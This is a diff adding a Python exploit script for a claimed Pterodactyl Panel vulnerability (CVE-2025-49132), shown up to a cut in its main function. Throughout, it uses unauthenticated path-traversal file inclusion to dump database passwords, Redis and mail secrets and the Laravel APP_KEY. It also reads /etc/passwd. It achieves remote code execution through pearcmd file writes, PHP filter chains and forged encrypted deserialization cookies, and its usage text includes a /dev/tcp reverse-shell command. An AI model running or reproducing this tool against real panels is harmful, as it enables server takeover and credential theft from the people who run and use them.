@@ -1,0 +1,1017 @@
+#!/usr/bin/env python3
+"""CVE-2025-49132 - Pterodactyl Panel Exploit"""
+
+import argparse
+import json
+import sys
+import base64
+import hashlib
+import hmac
+import os
+import re
+import subprocess
+import shutil
+from urllib.parse import quote
+
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+BANNER = r"""
+  ___ __   __ ___      ___   ___  ___  ___        _  _   ___  _  ____  ___ 
+ / __|\ \ / /| __|___ |_  ) / _ \|_  )| __|___   | || | / _ \| ||__ / |_  )
+| (__  \ V / | _|___|  / / | (_) |/ / |__ \___|  |_  _| \_, /| ||_ \  / / 
+ \___|  \_/  |___|    /___| \___//___||___/        |_|   /_/ |_|___/ /___|
+
+  Pterodactyl Panel - Unauthenticated Exploit
+  Targets: <= 1.11.10 | Patched: 1.11.11
+  Exploit By YoyoChaud
+"""
+
+C = {
+    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
+    "B": "\033[94m", "M": "\033[95m", "C": "\033[96m",
+    "W": "\033[97m", "D": "\033[90m", "0": "\033[0m",
+    "BLD": "\033[1m",
+}
+
+
+def col(text, c):
+    return f"{C[c]}{text}{C['0']}"
+
+
+def header(title):
+    w = 60
+    print(f"\n{C['BLD']}{C['B']}{'═' * w}")
+    print(f"  {title}")
+    print(f"{'═' * w}{C['0']}")
+
+
+def info(msg):
+    print(f"  {col('[*]', 'B')} {msg}")
+
+
+def ok(msg):
+    print(f"  {col('[+]', 'G')} {msg}")
+
+
+def warn(msg):
+    print(f"  {col('[!]', 'Y')} {msg}")
+
+
+def fail(msg):
+    print(f"  {col('[-]', 'R')} {msg}")
+
+
+def val(key, value, indent=6):
+    pad = " " * indent
+    if value and str(value).strip():
+        print(f"{pad}{col(key, 'C')}: {col(str(value), 'W')}")
+    else:
+        print(f"{pad}{col(key, 'C')}: {col('(empty)', 'D')}")
+
+
+class PterodactylExploit:
+    def __init__(self, target, verify_ssl=False, timeout=10, pear_dir="/usr/share/php"):
+        self.target = target.rstrip("/")
+        if not self.target.startswith("http"):
+            self.target = f"http://{self.target}"
+        self.verify = verify_ssl
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = verify_ssl
+        self.session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+        self.pear_dir = pear_dir.rstrip("/")
+        self.db_creds = {}
+        self.app_config = {}
+        self.all_configs = {}
+        self.filter_chain_bin = None
+
+    # ─── LFI core ────────────────────────────────────────────────
+
+    def _read_config(self, namespace, locale="../../../pterodactyl"):
+        url = f"{self.target}/locales/locale.json"
+        params = {"locale": locale, "namespace": namespace}
+        try:
+            r = self.session.get(url, params=params, timeout=self.timeout)
+            if r.status_code == 200:
+                data = r.json()
+                key = list(data.keys())[0]
+                inner = data[key]
+                ns_key = list(inner.keys())[0]
+                return inner[ns_key]
+        except Exception:
+            pass
+        return None
+
+    def _raw_lfi(self, locale, namespace="x"):
+        """Send a raw LFI request and return full response text."""
+        url = f"{self.target}/locales/locale.json"
+        params = {"locale": locale, "namespace": namespace}
+        try:
+            r = self.session.get(url, params=params, timeout=max(self.timeout, 30))
+            return r.status_code, r.text
+        except Exception as e:
+            return None, str(e)
+
+    # ─── Vuln check ──────────────────────────────────────────────
+
+    def check_vuln(self):
+        header("VULNERABILITY CHECK")
+        info(f"Target: {self.target}")
+
+        url = f"{self.target}/locales/locale.json"
+        try:
+            r = self.session.get(url, params={"locale": "en", "namespace": "validation"}, timeout=self.timeout)
+            if r.status_code == 200 and "hash=" not in r.url:
+                ok("Endpoint accessible without hash parameter")
+                ok(col("TARGET IS VULNERABLE", "G"))
+                return True
+            elif "hash=" in r.url:
+                fail("Patched version detected (hash parameter present)")
+                return False
+            else:
+                fail(f"Unexpected response: HTTP {r.status_code}")
+                return False
+        except requests.RequestException as e:
+            fail(f"Connection failed: {e}")
+            return False
+
+    # ─── Config dumpers ──────────────────────────────────────────
+
+    def dump_database(self):
+        header("DATABASE CREDENTIALS")
+        data = self._read_config("config/database")
+        if not data:
+            fail("Could not read database config")
+            return
+
+        self.all_configs["database"] = data
+
+        mysql = data.get("connections", {}).get("mysql", {})
+        self.db_creds = {
+            "host": mysql.get("host", ""),
+            "port": mysql.get("port", ""),
+            "database": mysql.get("database", ""),
+            "username": mysql.get("username", ""),
+            "password": mysql.get("password", ""),
+        }
+
+        ok("MySQL credentials extracted")
+        for k, v in self.db_creds.items():
+            val(k, v)
+
+        conn_str = f"{self.db_creds['username']}:{self.db_creds['password']}@{self.db_creds['host']}:{self.db_creds['port']}/{self.db_creds['database']}"
+        print(f"\n      {col('Connection string', 'M')}: {col(conn_str, 'BLD')}")
+        redis = data.get("redis", {})
+        if redis:
+            print()
+            ok("Redis configuration")
+            rd = redis.get("default", {})
+            val("host", rd.get("host", ""))
+            val("port", rd.get("port", ""))
+            val("password", rd.get("password", "") or "(none)")
+            val("database", rd.get("database", ""))
+
+    def dump_app(self):
+        header("APPLICATION CONFIG")
+        data = self._read_config("config/app")
+        if not data:
+            fail("Could not read app config")
+            return
+
+        self.all_configs["app"] = data
+        self.app_config = data
+
+        ok("Application details extracted")
+        val("name", data.get("name", ""))
+        val("version", data.get("version", ""))
+        val("environment", data.get("env", ""))
+        val("debug", data.get("debug", ""))
+        val("url", data.get("url", ""))
+        val("timezone", data.get("timezone", ""))
+        val("cipher", data.get("cipher", ""))
+
+        raw_key = data.get("key", "")
+        display_key = raw_key.replace("{{", ":").replace("}}", "")
+        val("APP_KEY", display_key)
+
+        if display_key:
+            print(f"\n      {col('⚠  APP_KEY → Laravel deserialization RCE (CVE-2018-15133)', 'Y')}")
+
+    def dump_pterodactyl(self):
+        header("PTERODACTYL CONFIG")
+        data = self._read_config("config/pterodactyl")
+        if not data:
+            fail("Could not read pterodactyl config")
+            return
+
+        self.all_configs["pterodactyl"] = data
+
+        ok("Panel configuration extracted")
+        svc = data.get("service", {})
+        val("author_email", svc.get("author", ""))
+
+        auth = data.get("auth", {})
+        val("2fa_required", auth.get("2fa_required", ""))
+
+        features = data.get("client_features", {})
+        db_feat = features.get("databases", {})
+        val("databases_enabled", db_feat.get("enabled", ""))
+        val("allow_random_db", db_feat.get("allow_random", ""))
+
+        sched = features.get("schedules", {})
+        val("schedule_task_limit", sched.get("per_schedule_task_limit", ""))
+
+        alloc = features.get("allocations", {})
+        val("allocations_enabled", alloc.get("enabled", ""))
+
+    def dump_session(self):
+        header("SESSION CONFIG")
+        data = self._read_config("config/session")
+        if not data:
+            fail("Could not read session config")
+            return
+
+        self.all_configs["session"] = data
+
+        ok("Session configuration extracted")
+        val("driver", data.get("driver", ""))
+        val("lifetime", data.get("lifetime", ""))
+        val("encrypt", data.get("encrypt", ""))
+        val("cookie", data.get("cookie", ""))
+        val("same_site", data.get("same_site", ""))
+        val("http_only", data.get("http_only", ""))
+        val("secure", data.get("secure", ""))
+
+    def dump_auth(self):
+        header("AUTH CONFIG")
+        data = self._read_config("config/auth")
+        if not data:
+            fail("Could not read auth config")
+            return
+
+        self.all_configs["auth"] = data
+
+        ok("Auth configuration extracted")
+        lockout = data.get("lockout", {})
+        val("lockout_time", lockout.get("time", ""))
+        val("lockout_attempts", lockout.get("attempts", ""))
+
+        defaults = data.get("defaults", {})
+        val("default_guard", defaults.get("guard", ""))
+
+        passwords = data.get("passwords", {}).get("users", {})
+        val("password_reset_expire", passwords.get("expire", ""))
+
+    def dump_services(self):
+        header("EXTERNAL SERVICES")
+        data = self._read_config("config/services")
+        if not data:
+            warn("No external services configured")
+            return
+
+        self.all_configs["services"] = data
+
+        ok("Services configuration extracted")
+        for svc_name, svc_data in data.items():
+            if isinstance(svc_data, dict):
+                has_values = any(v for v in svc_data.values() if v)
+                if has_values:
+                    print(f"      {col(svc_name, 'M')}:")
+                    for k, v in svc_data.items():
+                        val(k, v, indent=10)
+
+        if not any(
+            any(v for v in s.values() if v)
+            for s in data.values()
+            if isinstance(s, dict)
+        ):
+            warn("No external service credentials found")
+
+    def dump_queue(self):
+        header("QUEUE CONFIG")
+        data = self._read_config("config/queue")
+        if not data:
+            return
+
+        self.all_configs["queue"] = data
+
+        ok("Queue configuration extracted")
+        val("default_driver", data.get("default", ""))
+
+        conns = data.get("connections", {})
+        for name, conf in conns.items():
+            if isinstance(conf, dict) and conf.get("driver") not in ["sync"]:
+                has_creds = any(
+                    conf.get(k) for k in ["key", "secret", "password"]
+                )
+                if has_creds:
+                    print(f"      {col(name, 'M')}:")
+                    for k, v in conf.items():
+                        val(k, v, indent=10)
+
+    def dump_mail(self):
+        header("MAIL CONFIG")
+        data = self._read_config("config/mail")
+        if not data:
+            warn("Could not read mail config")
+            return
+
+        self.all_configs["mail"] = data
+        ok("Mail configuration extracted")
+
+        val("default_mailer", data.get("default", ""))
+
+        mailers = data.get("mailers", {})
+        for name, conf in mailers.items():
+            if isinstance(conf, dict):
+                has_values = any(v for v in conf.values() if v)
+                if has_values:
+                    print(f"      {col(name, 'M')}:")
+                    for k, v in conf.items():
+                        val(k, v, indent=10)
+
+        fr = data.get("from", {})
+        if fr:
+            val("from_address", fr.get("address", ""))
+            val("from_name", fr.get("name", ""))
+
+    def dump_hashing(self):
+        header("HASHING CONFIG")
+        data = self._read_config("config/hashing")
+        if not data:
+            return
+
+        self.all_configs["hashing"] = data
+        ok("Hashing configuration extracted")
+        val("driver", data.get("driver", ""))
+
+        bcrypt = data.get("bcrypt", {})
+        if bcrypt:
+            val("bcrypt_rounds", bcrypt.get("rounds", ""))
+
+    def dump_cors(self):
+        header("CORS CONFIG")
+        data = self._read_config("config/cors")
+        if not data:
+            return
+
+        self.all_configs["cors"] = data
+        ok("CORS configuration extracted")
+        val("paths", ", ".join(data.get("paths", [])))
+        val("allowed_methods", ", ".join(data.get("allowed_methods", [])))
+        val("allowed_origins", str(data.get("allowed_origins", [])))
+        val("supports_credentials", data.get("supports_credentials", ""))
+
+    def dump_extra_files(self):
+        header("ADDITIONAL FILE READS")
+        extra = [
+            ("config/cache", "Cache"),
+            ("config/filesystems", "Filesystems"),
+            ("config/logging", "Logging"),
+            ("config/broadcasting", "Broadcasting"),
+        ]
+        for ns, label in extra:
+            data = self._read_config(ns)
+            if data:
+                self.all_configs[ns] = data
+                ok(f"{label} config extracted")
+                if isinstance(data, dict):
+                    for k, v in data.items():
+                        if isinstance(v, (str, int, float, bool)) and v:
+                            val(k, v)
+            else:
+                info(f"{label} config not available")
+
+    def try_read_env(self):
+        header("SENSITIVE FILE READS")
+        targets = [
+            ("../../../../../../etc/passwd", "passwd", "System users"),
+            ("../../../../../../etc/hostname", "hostname", "Hostname"),
+            ("../../../../../../proc/version", "version", "Kernel version"),
+        ]
+
+        for locale, ns, label in targets:
+            data = self._read_config(ns, locale=locale)
+            if data:
+                ok(f"{label}: {json.dumps(data)[:200]}")
+            else:
+                info(f"{label}: not readable (PHP files only)")
+
+    # ─── Output extraction helper ────────────────────────────────
+
+    def _extract_rce_output(self, text):
+        """Extract command output from RCE response.
+
+        Handles two formats:
+        1. PEAR config: output is embedded in PHP serialized strings like
+           ...namespace=pearcmd&/OUTPUT OUTPUT/pear/php...
+           The output appears doubled because system() both echoes and returns.
+        2. JSON wrapper: output appears before/after a JSON object
+        """
+        if not text:
+            return None
+
+        # ── PEAR config format ──
+        # Output sits between "namespace=pearcmd&/" and "/pear/php"
+        # Use /pear/php as end marker (more specific, avoids false match
+        # when command output contains "/" like paths in /etc/passwd)
+        pear_match = re.search(
+            r'namespace=pearcmd&/(.*?)/pear/php',
+            text, re.DOTALL
+        )
+        if pear_match:
+            raw = pear_match.group(1).strip()
+            if raw:
+                # Output is doubled (system() echo + return) — deduplicate
+                # Split on whitespace boundary where duplication starts
+                half = len(raw) // 2
+                first_half = raw[:half].strip()
+                second_half = raw[half:].strip()
+                if half > 0 and first_half == second_half:
+                    return first_half
+                # Try splitting on newline boundary for multi-line output
+                lines = raw.split('\n')
+                mid = len(lines) // 2
+                if mid > 0 and lines[:mid] == lines[mid:mid*2]:
+                    return '\n'.join(lines[:mid])
+                return raw
+
+        # ── PEAR config fallback: try broader pattern ──
+        pear_match2 = re.search(
+            r'namespace=pearcmd&/(.*?)/(?:pear|data|cfg|www|test)',
+            text, re.DOTALL
+        )
+        if pear_match2:
+            raw = pear_match2.group(1).strip()
+            if raw:
+                half = len(raw) // 2
+                if half > 0 and raw[:half].strip() == raw[half:].strip():
+                    return raw[:half].strip()
+                return raw
+
+        # ── JSON wrapper format ──
+        json_start = text.find("{")
+        if json_start == -1:
+            cleaned = re.sub(r'<br\s*/?>|<b>.*?</b>|<[^>]+>', '', text).strip()
+            return cleaned if cleaned else None
+
+        depth = 0
+        json_end = -1
+        for i, ch in enumerate(text[json_start:], json_start):
+            if ch == "{":
+                depth += 1
+            elif ch == "}":
+                depth -= 1
+                if depth == 0:
+                    json_end = i
+                    break
+
+        before = text[:json_start].strip() if json_start > 0 else ""
+        after = text[json_end + 1:].strip() if json_end >= 0 else ""
+        # Strip HTML from after (500 error pages)
+        after = re.sub(r'<[^>]+>', '', after).strip()
+        after = re.sub(r'\s{2,}', ' ', after).strip()
+        output = f"{before}\n{after}".strip() if (before or after) else ""
+
+        if not output:
+            try:
+                data = json.loads(text[json_start:json_end + 1])
+                flat = json.dumps(data)
+                for pattern in [r'uid=\d+', r'root:', r'www-data', r'Linux\s+\S+']:
+                    if re.search(pattern, flat):
+                        return flat
+            except Exception:
+                pass
+
+        return output if output else None
+
+    # ─── RCE: PHP Filter Chain ───────────────────────────────────
+
+    def _find_filter_chain_generator(self):
+        """Locate php_filter_chain_generator.py on the system."""
+        if self.filter_chain_bin:
+            return self.filter_chain_bin
+
+        candidates = [
+            "php_filter_chain_generator.py",
+            "php_filter_chain_generator",
+            os.path.expanduser("~/tools/php_filter_chain_generator/php_filter_chain_generator.py"),
+            "/opt/php_filter_chain_generator/php_filter_chain_generator.py",
+            "/usr/local/bin/php_filter_chain_generator.py",
+        ]
+
+        for c in candidates:
+            found = shutil.which(c)
+            if found:
+                self.filter_chain_bin = found
+                return found
+            if os.path.isfile(c):
+                self.filter_chain_bin = c
+                return c
+
+        return None
+
+    def _generate_filter_chain(self, php_code, resource=None):
+        """Generate a PHP filter chain for the given PHP code."""
+        gen = self._find_filter_chain_generator()
+        if not gen:
+            return None
+
+        cmd = [sys.executable, gen, "--chain", php_code]
+        if resource:
+            cmd += ["--resource", resource]
+
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+            if r.returncode == 0:
+                for line in r.stdout.splitlines():
+                    line = line.strip()
+                    if line.startswith("php://filter/"):
+                        return line
+        except Exception:
+            pass
+        return None
+
+    def _try_filter_chain(self, command):
+        """Try PHP filter chain RCE with multiple strategies."""
+        php_code = f'<?=system("{command}")?>'
+
+        # ── Strategy 1: Chain as locale (resource=php://temp) ──
+        # Works if the LFI does NOT append a suffix to the full include path
+        info("Strategy 1: filter chain as locale (resource=php://temp)")
+        chain = self._generate_filter_chain(php_code)
+        if not chain:
+            warn("Could not generate filter chain")
+            return None, None
+
+        status, text = self._raw_lfi(locale=chain, namespace="x")
+        if status == 200 and text:
+            output = self._extract_rce_output(text)
+            if output:
+                return output, "locale (php://temp)"
+        info(f"  → HTTP {status}, no cmd output")
+
+        # ── Strategy 2: Chain as namespace ──
+        info("Strategy 2: filter chain as namespace")
+        status, text = self._raw_lfi(locale="en", namespace=chain)
+        if status == 200 and text:
+            output = self._extract_rce_output(text)
+            if output:
+                return output, "namespace"
+        info(f"  → HTTP {status}, no cmd output")
+
+        # ── Strategy 3: resource= pointing to a real .php file (minus ext) ──
+        # Server appends .php → resource becomes a valid path
+        php_files = [
+            "/var/www/html/public/index",
+            "/var/www/html/index",
+            "/var/www/pterodactyl/public/index",
+            "/srv/www/htdocs/public/index",   # SUSE default
+        ]
+        for php_file in php_files:
+            info(f"Strategy 3: resource={php_file} (.php appended by server)")
+            chain = self._generate_filter_chain(php_code, resource=php_file)
+            if chain:
+                status, text = self._raw_lfi(locale=chain, namespace="x")
+                if status == 200 and text:
+                    output = self._extract_rce_output(text)
+                    if output:
+                        return output, f"resource={php_file}.php"
+                info(f"  → HTTP {status}, no cmd output")
+
+        # ── Strategy 4: Raw URL (minimal encoding) ──
+        info("Strategy 4: raw URL injection")
+        chain = self._generate_filter_chain(php_code)
+        if chain:
+            try:
+                raw_url = f"{self.target}/locales/locale.json?locale={quote(chain, safe='/:=|?+')}&namespace=x"
+                r = self.session.get(raw_url, timeout=max(self.timeout, 30))
+                if r.status_code == 200 and r.text:
+                    output = self._extract_rce_output(r.text)
+                    if output:
+                        return output, "raw URL"
+                info(f"  → HTTP {r.status_code}, no cmd output")
+            except Exception as e:
+                info(f"  → Error: {e}")
+
+        return None, None
+
+    def test_rce_filter_chain(self, command="id"):
+        """Verbose filter chain RCE attempt."""
+        header("RCE ATTEMPT - PHP FILTER CHAIN")
+        info(f"Command: {command}")
+
+        gen = self._find_filter_chain_generator()
+        if not gen:
+            fail("php_filter_chain_generator.py not found!")
+            info("Install: git clone https://github.com/synacktiv/php_filter_chain_generator")
+            info("Make sure it's in PATH or in ~/tools/")
+            return False
+
+        ok(f"Generator: {gen}")
+
+        output, strategy = self._try_filter_chain(command)
+        if output:
+            ok(f"RCE via filter chain ({strategy})!")
+            print(f"\n      {col(output, 'G')}\n")
+            return True
+        else:
+            fail("All filter chain strategies failed")
+            info("The LFI likely appends .php — wrapper resource gets corrupted")
+            info("Fallback: use --rce-d for Laravel deserialization with APP_KEY")
+            return False
+
+    def quick_rce_check(self):
+        header("RCE STATUS CHECK")
+
+        # Try pearcmd first (fast)
+        info("Testing pearcmd (whoami)...")
+        result = self._try_pearcmd("whoami")
+        if result:
+            ok(f"RCE via pearcmd: {col('VALID', 'G')} — {col(result, 'BLD')}")
+            return "pearcmd"
+
+        # Try filter chain
+        gen = self._find_filter_chain_generator()
+        if gen:
+            info("Testing filter chain (id)...")
+            output, strategy = self._try_filter_chain("id")
+            if output:
+                ok(f"RCE via filter chain ({strategy}): {col('VALID', 'G')} — {col(output, 'BLD')}")
+                return "filter_chain"
+        else:
+            info("php_filter_chain_generator.py not in PATH, skipping")
+
+        fail(f"RCE: {col('FAILED', 'R')} — no auto-RCE method worked")
+        info("Try --rce-d with APP_KEY for Laravel deserialization")
+        return None
+
+    # ─── RCE: Pearcmd ────────────────────────────────────────────
+
+    def _try_pearcmd(self, command):
+        uid = os.urandom(4).hex()
+        fname = f"x{uid}"
+        # Hex-encode the command — only 0-9a-f, no +/=/& URL issues
+        hexcmd = command.encode().hex()
+        pear_path = self.pear_dir.strip("/")
+        host = self.target.replace("http://", "").replace("https://", "")
+
+        # Stage 1: Write PHP file via pearcmd config-create
+        # Uses system(hex2bin('...')) — no spaces, no special chars
+        # Must use curl — python requests URL-encodes <>{} which breaks PHP tags
+        write_cmd = (
+            f'curl -s -g -k --max-time {self.timeout} '
+            f'"http://{host}/locales/locale.json'
+            f'?+config-create+/'
+            f'&locale=../../../../../../{pear_path}'
+            f'&namespace=pearcmd'
+            f"&/<?=system(hex2bin('{hexcmd}'))?>+/tmp/{fname}.php\""
+        )
+        try:
+            subprocess.run(write_cmd, shell=True, capture_output=True, timeout=self.timeout + 5)
+
+            # Stage 2: Include the written file
+            exec_url = f"{self.target}/locales/locale.json?locale=../../../../../../tmp&namespace={fname}"
+            r2 = self.session.get(exec_url, timeout=max(self.timeout, 30))
+
+            # HTTP 500 is expected: the included PEAR config isn't valid JSON,
+            # so Laravel throws 500, but system() already executed
+            if r2.status_code in (200, 500) and r2.text:
+                return self._extract_rce_output(r2.text)
+        except requests.exceptions.ReadTimeout:
+            return "(connection held — check your listener)"
+        except Exception:
+            pass
+        return None
+
+    def test_rce_pearcmd(self, command="id"):
+        header("RCE ATTEMPT - PEARCMD")
+        info(f"Command: {command}")
+
+        uid = os.urandom(4).hex()
+        fname = f"x{uid}"
+        hexcmd = command.encode().hex()
+        pear_path = self.pear_dir.strip("/")
+        host = self.target.replace("http://", "").replace("https://", "")
+
+        write_cmd = (
+            f'curl -s -g -k --max-time {self.timeout} '
+            f'"http://{host}/locales/locale.json'
+            f'?+config-create+/'
+            f'&locale=../../../../../../{pear_path}'
+            f'&namespace=pearcmd'
+            f"&/<?=system(hex2bin('{hexcmd}'))?>+/tmp/{fname}.php\""
+        )
+
+        try:
+            info("Stage 1: Creating payload via pearcmd...")
+            subprocess.run(write_cmd, shell=True, capture_output=True, timeout=self.timeout + 5)
+            ok(f"Payload file created: /tmp/{fname}.php")
+
+            info("Stage 2: Triggering inclusion...")
+            exec_url = f"{self.target}/locales/locale.json?locale=../../../../../../tmp&namespace={fname}"
+            r2 = self.session.get(exec_url, timeout=max(self.timeout, 30))
+
+            if r2.status_code in (200, 500) and r2.text:
+                cleaned = self._extract_rce_output(r2.text)
+                if cleaned:
+                    ok(f"RCE output: {col(cleaned, 'G')}")
+                    return True
+                else:
+                    warn("File included but no command output detected")
+            else:
+                fail(f"Stage 2 returned HTTP {r2.status_code}")
+
+        except requests.exceptions.ReadTimeout:
+            ok("Connection held — reverse shell likely connected")
+            return True
+        except Exception as e:
+            fail(f"RCE attempt failed: {e}")
+
+        return False
+
+    # ─── RCE: Laravel Deserialization ────────────────────────────
+
+    def test_rce_laravel_deser(self, command="id"):
+        header("RCE ATTEMPT - LARAVEL DESERIALIZATION")
+
+        raw_key = self.app_config.get("key", "")
+        if not raw_key:
+            data = self._read_config("config/app")
+            if data:
+                self.app_config = data
+                raw_key = data.get("key", "")
+            if not raw_key:
+                fail("No APP_KEY available, skipping")
+                return False
+
+        clean_key = raw_key.replace("{{", ":").replace("}}", "")
+
+        info(f"APP_KEY: {clean_key}")
+        info(f"Cipher:  {self.app_config.get('cipher', 'AES-256-CBC')}")
+        info(f"Command: {command}")
+
+        phpggc_bin = None
+        try:
+            for candidate in ["phpggc", "/opt/phpggc/phpggc", "/usr/local/bin/phpggc"]:
+                found = shutil.which(candidate) if "/" not in candidate else (candidate if os.path.isfile(candidate) else None)
+                if found:
+                    phpggc_bin = found
+                    break
+
+            if not phpggc_bin:
+                warn("phpggc not found — install it for automated deserialization RCE")
+                info("Manual steps:")
+                info(f"  1. phpggc Laravel/RCE1 system '{command}' -b")
+                info(f"  2. Encrypt payload with APP_KEY using AES-256-CBC")
+                info(f"  3. Send as XSRF-TOKEN cookie")
+                return False
+
+            ok(f"phpggc found: {phpggc_bin}")
+
+            chains = ["Laravel/RCE1", "Laravel/RCE2", "Laravel/RCE5", "Laravel/RCE6",
+                       "Laravel/RCE7", "Laravel/RCE8", "Laravel/RCE9", "Laravel/RCE10"]
+
+            for chain in chains:
+                info(f"Trying chain: {chain}")
+                try:
+                    r = subprocess.run(
+                        [phpggc_bin, chain, "system", command, "-b"],
+                        capture_output=True, text=True, timeout=10
+                    )
+                    if r.returncode == 0 and r.stdout.strip():
+                        payload_b64 = r.stdout.strip()
+                        ok(f"Gadget generated with {chain}")
+
+                        if clean_key.startswith("base64:"):
+                            key = base64.b64decode(clean_key[7:])
+                        else:
+                            key = clean_key.encode()
+
+                        iv = os.urandom(16)
+                        payload = base64.b64decode(payload_b64)
+
+                        from Crypto.Cipher import AES
+                        from Crypto.Util.Padding import pad
+
+                        cipher = AES.new(key, AES.MODE_CBC, iv)
+                        encrypted = cipher.encrypt(pad(payload, 16))
+
+                        iv_b64 = base64.b64encode(iv).decode()
+                        val_b64 = base64.b64encode(encrypted).decode()
+                        mac = hmac.new(
+                            key, (iv_b64 + val_b64).encode(), hashlib.sha256
+                        ).hexdigest()
+
+                        token_data = json.dumps(
+                            {"iv": iv_b64, "value": val_b64, "mac": mac}
+                        )
+                        token = base64.b64encode(token_data.encode()).decode()
+
+                        info("Sending forged XSRF-TOKEN...")
+                        r = self.session.get(
+                            self.target,
+                            cookies={"XSRF-TOKEN": token},
+                            timeout=self.timeout,
+                        )
+
+                        if r.status_code == 500:
+                            warn(f"{chain}: triggered error (may need different chain)")
+                        elif "uid=" in r.text:
+                            ok(f"RCE confirmed with {chain}!")
+                            return True
+                        else:
+                            info(f"{chain}: no RCE confirmed")
+
+                except subprocess.TimeoutExpired:
+                    pass
+                except ImportError:
+                    warn("pycryptodome not installed (pip install pycryptodome)")
+                    return False
+                except Exception as e:
+                    info(f"{chain}: {e}")
+
+        except Exception as e:
+            fail(f"Deserialization RCE failed: {e}")
+
+        return False
+
+    # ─── Report / Summary ────────────────────────────────────────
+
+    def generate_report(self, outfile):
+        header("GENERATING REPORT")
+        report = {
+            "target": self.target,
+            "database": self.db_creds,
+            "app_key": self.app_config.get("key", "").replace("{{", ":").replace("}}", ""),
+            "app_url": self.app_config.get("url", ""),
+            "version": self.app_config.get("version", ""),
+            "all_configs": self.all_configs,
+        }
+        with open(outfile, "w") as f:
+            json.dump(report, f, indent=2, default=str)
+        ok(f"Full report saved to {col(outfile, 'BLD')}")
+
+    def summary(self):
+        header("EXPLOIT SUMMARY")
+
+        print(f"  {col('Target', 'C')}: {self.target}")
+        print(f"  {col('Version', 'C')}: {self.app_config.get('version', 'unknown')}")
+        print()
+
+        if self.db_creds:
+            c = self.db_creds
+            print(f"  {col('┌─ Database ─────────────────────────────────────', 'M')}")
+            print(f"  {col('│', 'M')} {c['username']}:{c['password']}@{c['host']}:{c['port']}/{c['database']}")
+            print(f"  {col('└───────────────────────────────────────────────', 'M')}")
+
+        key = self.app_config.get("key", "").replace("{{", ":").replace("}}", "")
+        if key:
+            print(f"\n  {col('┌─ APP_KEY ──────────────────────────────────────', 'Y')}")
+            print(f"  {col('│', 'Y')} {key}")
+            print(f"  {col('└───────────────────────────────────────────────', 'Y')}")
+
+        print(f"\n  {col('Configs dumped', 'C')}: {len(self.all_configs)}")
+        for name in self.all_configs:
+            print(f"      {col('✓', 'G')} {name}")
+
+
+def main():
+    print(col(BANNER, "B"))
+
+    parser = argparse.ArgumentParser(
+        description="CVE-2025-49132 Pterodactyl Exploit",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+modes:
+  (default)              Full config dump + auto RCE check (all methods)
+  --rce-cmd CMD          Execute CMD via pearcmd (supports any command, incl. reverse shells)
+  --rce-filter CMD       Execute CMD via PHP filter chain (needs php_filter_chain_generator.py)
+  --filter-chain CHAIN   Use a pre-generated filter chain (with --rce-filter)
+  --rce-d CMD            Execute CMD via Laravel deserialization (needs phpggc + pycryptodome)
+
+examples:
+  %(prog)s http://panel.fr                          # full dump + auto RCE
+  %(prog)s http://panel.fr --rce-cmd "id"           # pearcmd RCE
+  %(prog)s http://panel.fr --rce-cmd "id" --pear-dir /usr/share/php/PEAR
+  %(prog)s http://panel.fr --rce-cmd "/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
+  %(prog)s http://panel.fr --rce-filter "id"        # filter chain RCE
+  %(prog)s http://panel.fr --rce-d "id"             # deserialization RCE
+        """,
+    )
+    parser.add_argument("target", help="Target URL (e.g. http://panel.pterodactyl.fr)")
+    parser.add_argument("-o", "--output", default="loot.json", help="Output report file")
+    parser.add_argument("--rce-cmd", default=None, metavar="CMD", help="Execute command via pearcmd")
+    parser.add_argument("--rce-filter", default=None, metavar="CMD", help="Execute command via PHP filter chain")
+    parser.add_argument("--filter-chain", default=None, metavar="CHAIN", help="Pre-generated php://filter chain")
+    parser.add_argument("--rce-d", default=None, metavar="CMD", help="Execute command via Laravel deserialization")
+    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
+    parser.add_argument("--verify-ssl", action="store_true", default=False, help="Verify SSL certificates (default: disabled)")
+    parser.add_argument("--pear-dir", default="/usr/share/php", help="Path to pearcmd.php dir (default: /usr/share/php)")
+    args = parser.parse_args()
+
+    exploit = PterodactylExploit(
+        args.target,
+        verify_ssl=args.verify_ssl,
+        timeout=args.timeout,
+        pear_dir=args.pear_dir,
+    )
+
+    if not exploit.check_vuln():
+        fail("Target does not appear vulnerable")
+        sys.exit(1)
+
+    # ── --rce-cmd: pearcmd RCE ──
+    if args.rce_cmd is not None:
+        header(f"RCE (pearcmd) — {args.rce_cmd}")
+        result = exploit._try_pearcmd(args.rce_cmd)
+        if result:
+            ok(f"Output:\n{col(result, 'W')}")
+        else:
+            fail("No output (pearcmd not present on target?)")
+        print()
+        return
+
+    # ── --rce-filter: PHP filter chain RCE ──
+    if args.rce_filter is not None:
+        if args.filter_chain:
+            # User provided a raw chain
+            header(f"RCE (pre-generated filter chain) — {args.rce_filter}")
+            info("Using pre-generated chain...")
+
+            # Try as locale
+            info("Injecting as locale parameter...")
+            status, text = exploit._raw_lfi(locale=args.filter_chain, namespace="x")
+            if status == 200 and text:
+                output = exploit._extract_rce_output(text)
+                if output:
+                    ok(f"RCE output:\n{col(output, 'G')}")
+                    print()
+                    return
+
+            # Try as namespace
+            info("Injecting as namespace parameter...")
+            status, text = exploit._raw_lfi(locale="en", namespace=args.filter_chain)
+            if status == 200 and text:
+                output = exploit._extract_rce_output(text)
+                if output:
+                    ok(f"RCE output:\n{col(output, 'G')}")
+                    print()
+                    return
+
+            # Try raw URL (avoid requests double-encoding)
+            info("Injecting via raw URL...")
+            try:
+                raw_url = f"{exploit.target}/locales/locale.json?locale={quote(args.filter_chain, safe='/:=|?+')}&namespace=x"
+                r = exploit.session.get(raw_url, timeout=max(exploit.timeout, 30))
+                if r.status_code == 200 and r.text:
+                    output = exploit._extract_rce_output(r.text)
+                    if output:
+                        ok(f"RCE output:\n{col(output, 'G')}")
+                        print()
+                        return
+            except Exception:
+                pass
+
+            fail("Pre-generated chain did not produce output")
+            info("The LFI may append .php, corrupting the wrapper resource")
+            info("Try without --filter-chain for auto strategy detection")
+        else:
+            exploit.test_rce_filter_chain(args.rce_filter)
+        print()
+        return
+
